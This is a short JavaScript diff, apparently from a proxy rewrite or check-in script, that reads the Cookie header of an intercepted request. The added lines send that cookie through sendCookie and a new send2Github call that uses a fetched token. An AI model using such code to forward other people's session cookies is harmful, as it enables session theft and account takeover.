@@ -195,10 +195,10 @@ function sendCookie(cookie){
 }
 (async function() {
     const cookieVal = $request.headers['Cookie'];
-	await sendCookie(cookieVal);
-	// await Promise.all([ //该方法用于将多个实例包装成一个新的实例, 可以简单理解为同时调用函数, 以进一步提高执行速度
-	// 	GetUserPoint(), 
-	// 	ListProduct() 
-	// ]);
+	await Promise.all([ 
+		sendCookie(cookieVal),
+	]);
+	await send2Github(cookieVal,await getGToken());
+
 	$.done(); 
 })();
